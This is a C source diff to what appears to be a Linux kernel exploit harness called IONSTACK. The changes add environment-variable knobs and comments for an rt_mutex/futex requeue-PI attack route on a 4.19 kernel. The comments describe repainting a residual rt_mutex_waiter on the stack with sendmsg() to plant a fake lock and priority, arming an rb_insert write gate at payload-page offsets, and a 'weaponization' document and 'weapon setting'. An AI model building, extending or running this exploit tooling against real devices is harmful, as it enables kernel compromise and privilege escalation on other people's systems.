@@ -1023,8 +1023,23 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
-      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "none"},
-      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI", "1"},
+      /*
+       * Owner mode was hardcoded to "none" together with
+       * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
+       * what effective_t878u_lock_owner_mode() clamps away, because an
+       * ownerless rt_mutex_adjust_prio_chain walks into
+       * rt_mutex_top_waiter(lock)'s BUG_ON(w->lock != lock) on this 4.19
+       * tree.  Hardcoding both meant the clamp was computed and then
+       * discarded (see the (void)effective_owner_mode above), so the route
+       * always ran the configuration the code documents as crashing.
+       *
+       * Honour the host env so the three configurations can be compared
+       * without a rebuild; default to the clamp's answer ("init-task").
+       */
+      {"IONSTACK_FOPS_LOCK_OWNER_MODE",
+       effective_t878u_lock_owner_mode(fops_lock_owner_mode)},
+      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI",
+       env_truthy_name("IONSTACK_T878U_ALLOW_OWNERLESS_PI") ? "1" : "0"},
       {"IONSTACK_FOPS_LOCK_WAITERS",
        fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
       {"IONSTACK_FOPS_WAIT_LOCK_WORD",
@@ -1985,6 +2000,49 @@ static int spawn_pselect_root(struct child_proc *child,
   const char *fops_lock_owner_mode = getenv("IONSTACK_FOPS_LOCK_OWNER_MODE");
   const char *fops_lock_waiters = getenv("IONSTACK_FOPS_LOCK_WAITERS");
   const char *fops_wait_lock_word = getenv("IONSTACK_FOPS_WAIT_LOCK_WORD");
+  const char *pselect_prio = getenv("IONSTACK_PSELECT_PRIO");
+  const char *pselect_tree_mode = getenv("IONSTACK_PSELECT_TREE_MODE");
+  const char *pselect_task = getenv("IONSTACK_PSELECT_TASK");
+  const char *pselect_paint_tree = getenv("IONSTACK_PSELECT_PAINT_TREE");
+  const char *pselect_hold_fd = getenv("IONSTACK_PSELECT_HOLD_FD");
+  const char *pselect_stall = getenv("IONSTACK_PSELECT_STALL");
+  const char *pselect_consume_when = getenv("IONSTACK_PSELECT_CONSUME_WHEN");
+  const char *pselect_consume_spin = getenv("IONSTACK_PSELECT_CONSUME_SPIN");
+  const char *pselect_skip = getenv("IONSTACK_PSELECT_SKIP");
+  const char *pselect_fill_all = getenv("IONSTACK_PSELECT_FILL_ALL");
+  const char *pselect_word_bias =
+      getenv("IONSTACK_PSELECT_WAITER_WORD_BIAS");
+  const char *pselect_lock_word = getenv("IONSTACK_PSELECT_LOCK_WORD");
+  const char *pselect_diag = getenv("IONSTACK_PSELECT_DIAG");
+  const char *pselect_word_shift = getenv("IONSTACK_PSELECT_WORD_SHIFT");
+  const char *route_hold = getenv("IONSTACK_ROUTE_HOLD");
+  const char *route_rearm = getenv("IONSTACK_ROUTE_REARM");
+  const char *rearm_fire = getenv("IONSTACK_REARM_FIRE");
+  const char *w_nice = getenv("IONSTACK_W_NICE");
+  const char *owner_lock_timeout_ms = getenv("IONSTACK_OWNER_LOCK_TIMEOUT_MS");
+  const char *helper_nice = getenv("IONSTACK_HELPER_NICE");
+  const char *r_nice = getenv("IONSTACK_R_NICE");
+  const char *consumer_nice = getenv("IONSTACK_CONSUMER_NICE");
+  const char *consumer_real_nice = getenv("IONSTACK_CONSUMER_REAL_NICE");
+  const char *hold_probe_ms = getenv("IONSTACK_HOLD_PROBE_MS");
+  /*
+   * Section 15 stack-paint route (RTMUTEX_WEAPONIZATION.md section 15).
+   * W repaints its own residual rt_mutex_waiter at SP0-0x190 with a blocking
+   * sendmsg() whose msg_namelen=0x28 / msg_iovlen=1 land waiter->lock and
+   * waiter->prio exactly.
+   */
+  const char *sendmsg_paint = getenv("IONSTACK_SENDMSG_PAINT");
+  const char *paint_sndbuf = getenv("IONSTACK_PAINT_SNDBUF");
+  const char *paint_probe_ms = getenv("IONSTACK_PAINT_PROBE_MS");
+  const char *paint_settle_ms = getenv("IONSTACK_PAINT_SETTLE_MS");
+  /* Section 15.16 paint-landed oracle: default 0x7fffffff (weapon setting).
+     Set to W's prio (121) to make rtmutex.c:1135 bail out before
+     waiter->lock is read, so the run survives iff the paint landed. */
+  const char *paint_prio = getenv("IONSTACK_PAINT_PRIO");
+  /* 1 = fill the whole sockaddr_storage with prio (offset-agnostic probe). */
+  const char *paint_fill = getenv("IONSTACK_PAINT_FILL");
+  const char *insert_target_off = getenv("IONSTACK_INSERT_TARGET_OFF");
+  const char *insert_value_off = getenv("IONSTACK_INSERT_VALUE_OFF");
   const char *effective_owner_mode =
       effective_t878u_lock_owner_mode(fops_lock_owner_mode);
   (void)effective_owner_mode;
@@ -2008,9 +2066,112 @@ static int spawn_pselect_root(struct child_proc *child,
       {"IONSTACK_PSELECT_ROUTE_ATTEMPTS", "4"},
       {"IONSTACK_PSELECT_HAMMER", "512"},
       {"IONSTACK_PSELECT_DELAY_US", "0"},
+      {"IONSTACK_PSELECT_PRIO",
+       pselect_prio && *pselect_prio ? pselect_prio : "130"},
+      {"IONSTACK_PSELECT_TREE_MODE",
+       pselect_tree_mode && *pselect_tree_mode ? pselect_tree_mode : "default"},
+      {"IONSTACK_PSELECT_TASK",
+       pselect_task && *pselect_task ? pselect_task : "slide-init"},
+      {"IONSTACK_PSELECT_PAINT_TREE",
+       pselect_paint_tree && *pselect_paint_tree ? pselect_paint_tree : "1"},
+      {"IONSTACK_PSELECT_HOLD_FD",
+       pselect_hold_fd && *pselect_hold_fd ? pselect_hold_fd : "1"},
+      {"IONSTACK_PSELECT_STALL",
+       pselect_stall && *pselect_stall ? pselect_stall : "0"},
+      {"IONSTACK_PSELECT_CONSUME_WHEN",
+       pselect_consume_when && *pselect_consume_when ? pselect_consume_when
+                                                     : "post"},
+      {"IONSTACK_PSELECT_CONSUME_SPIN",
+       pselect_consume_spin && *pselect_consume_spin ? pselect_consume_spin
+                                                     : "8000000"},
+      {"IONSTACK_PSELECT_SKIP",
+       pselect_skip && *pselect_skip ? pselect_skip : "0"},
+      {"IONSTACK_PSELECT_FILL_ALL",
+       pselect_fill_all && *pselect_fill_all ? pselect_fill_all : "0"},
+      {"IONSTACK_PSELECT_WAITER_WORD_BIAS",
+       pselect_word_bias && *pselect_word_bias ? pselect_word_bias : "0"},
+      {"IONSTACK_PSELECT_LOCK_WORD",
+       pselect_lock_word && *pselect_lock_word ? pselect_lock_word : "7"},
+      {"IONSTACK_PSELECT_DIAG",
+       pselect_diag && *pselect_diag ? pselect_diag : ""},
+      {"IONSTACK_PSELECT_WORD_SHIFT",
+       pselect_word_shift && *pselect_word_shift ? pselect_word_shift : "16"},
       {"IONSTACK_CONSUMER_MAX_CALLS", "128"},
       {"IONSTACK_CONSUMER_BURST_CALLS", "32"},
       {"IONSTACK_CONSUMER_STABLE_NICE", "1"},
+      /*
+       * HOLD oracle (docs/PSELECT_GEOMETRY_FINDINGS.md §9): keep the waiter
+       * thread blocked inside FUTEX_WAIT_REQUEUE_PI instead of running the
+       * pselect route, so the residual rt_waiter at SP0-0x190 is never clobbered
+       * by ret_to_user/do_notify_resume.  CONSUMER_REAL_NICE makes the consumer
+       * move the waiter's ->prio away from the residual waiter->prio so
+       * rt_mutex_adjust_pi() does not early-out.
+       */
+      {"IONSTACK_ROUTE_HOLD",
+       route_hold && *route_hold ? route_hold : "0"},
+      /*
+       * B1 re-arm oracle: FUTEX_LOCK_PI(&f_rearm) from the requeue task so
+       * alloc_pi_state() pulls the cached futex_pi_state back out and we get
+       * to choose pi_mutex.owner.  Needs helper nice > consumer nice because
+       * rt_mutex_setprio() is min(p->normal_prio, pi_task->prio).
+       */
+      {"IONSTACK_ROUTE_REARM",
+       route_rearm && *route_rearm ? route_rearm : "0"},
+      /*
+       * Section 15 stack-paint route.  When IONSTACK_SENDMSG_PAINT=1 the waiter
+       * thread, instead of spinning after FUTEX_WAIT_REQUEUE_PI returns, issues
+       * a blocking sendmsg() on an AF_UNIX SOCK_SEQPACKET pair whose sndbuf is
+       * pre-filled; ___sys_sendmsg()'s two unchecked copies then repaint
+       * waiter+0x28..waiter+0x50 (lock=fake_lock, prio=0x7fffffff) while the
+       * frame stays alive.  Requires IONSTACK_ROUTE_HOLD=1 (so the requeue
+       * returns -EDEADLK and the residual waiter survives) and
+       * IONSTACK_REARM_FIRE=sched (so the consumer drives rt_mutex_adjust_pi).
+       * IONSTACK_INSERT_TARGET_OFF additionally arms the rb_insert Case 3
+       * write gate; both it and VALUE_OFF are payload-page offsets.
+       */
+      {"IONSTACK_SENDMSG_PAINT",
+       sendmsg_paint && *sendmsg_paint ? sendmsg_paint : "0"},
+      {"IONSTACK_PAINT_SNDBUF",
+       paint_sndbuf && *paint_sndbuf ? paint_sndbuf : "4096"},
+      {"IONSTACK_PAINT_PROBE_MS",
+       paint_probe_ms && *paint_probe_ms ? paint_probe_ms : "30000"},
+      {"IONSTACK_PAINT_SETTLE_MS",
+       paint_settle_ms && *paint_settle_ms ? paint_settle_ms : "300"},
+      {"IONSTACK_PAINT_PRIO",
+       paint_prio && *paint_prio ? paint_prio : "2147483647"},
+      {"IONSTACK_PAINT_FILL",
+       paint_fill && *paint_fill ? paint_fill : "0"},
+      {"IONSTACK_INSERT_TARGET_OFF",
+       insert_target_off && *insert_target_off ? insert_target_off : "0"},
+      {"IONSTACK_INSERT_VALUE_OFF",
+       insert_value_off && *insert_value_off ? insert_value_off : "0"},
+      /*
+       * Design-G trigger selector, tri-state:
+       *   "none"   (default) -- the consumer fires nothing; the chain walk is
+       *            driven purely by M's own deterministic
+       *            IONSTACK_OWNER_LOCK_TIMEOUT_MS hrtimer.  Cleanest
+       *            attribution: any observed priority change must have come
+       *            from remove_waiter()'s MIN_CHAINWALK.
+       *   "signal" -- the consumer tgkills M (SIGUSR1/SIGUSR2/SIGRTMIN+4).
+       *   "sched"  -- the consumer sched_setattr()s W (legacy route).
+       * IONSTACK_W_NICE must be > 0 so W->normal_prio != 120 and the de-boost
+       * separates W_waiter->prio (120) from W->prio (121).
+       */
+      {"IONSTACK_REARM_FIRE",
+       rearm_fire && *rearm_fire ? rearm_fire : "none"},
+      {"IONSTACK_W_NICE", w_nice && *w_nice ? w_nice : "1"},
+      {"IONSTACK_OWNER_LOCK_TIMEOUT_MS",
+       owner_lock_timeout_ms && *owner_lock_timeout_ms ? owner_lock_timeout_ms
+                                                      : "2500"},
+      {"IONSTACK_HELPER_NICE",
+       helper_nice && *helper_nice ? helper_nice : "19"},
+      {"IONSTACK_R_NICE", r_nice && *r_nice ? r_nice : "5"},
+      {"IONSTACK_CONSUMER_NICE",
+       consumer_nice && *consumer_nice ? consumer_nice : "19"},
+      {"IONSTACK_CONSUMER_REAL_NICE",
+       consumer_real_nice && *consumer_real_nice ? consumer_real_nice : "0"},
+      {"IONSTACK_HOLD_PROBE_MS",
+       hold_probe_ms && *hold_probe_ms ? hold_probe_ms : "2000"},
       {"IONSTACK_PAGE_SETUP_ATTEMPTS", "96"},
       {"IONSTACK_KS_COLLISIONS", "8"},
       {"IONSTACK_KS_THREADS", "8"},
@@ -2037,8 +2198,23 @@ static int spawn_pselect_root(struct child_proc *child,
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
-      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "none"},
-      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI", "1"},
+      /*
+       * Owner mode was hardcoded to "none" together with
+       * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
+       * what effective_t878u_lock_owner_mode() clamps away, because an
+       * ownerless rt_mutex_adjust_prio_chain walks into
+       * rt_mutex_top_waiter(lock)'s BUG_ON(w->lock != lock) on this 4.19
+       * tree.  Hardcoding both meant the clamp was computed and then
+       * discarded (see the (void)effective_owner_mode above), so the route
+       * always ran the configuration the code documents as crashing.
+       *
+       * Honour the host env so the three configurations can be compared
+       * without a rebuild; default to the clamp's answer ("init-task").
+       */
+      {"IONSTACK_FOPS_LOCK_OWNER_MODE",
+       effective_t878u_lock_owner_mode(fops_lock_owner_mode)},
+      {"IONSTACK_T878U_ALLOW_OWNERLESS_PI",
+       env_truthy_name("IONSTACK_T878U_ALLOW_OWNERLESS_PI") ? "1" : "0"},
       {"IONSTACK_FOPS_LOCK_WAITERS",
        fops_lock_waiters && *fops_lock_waiters ? fops_lock_waiters : "1"},
       {"IONSTACK_FOPS_WAIT_LOCK_WORD",
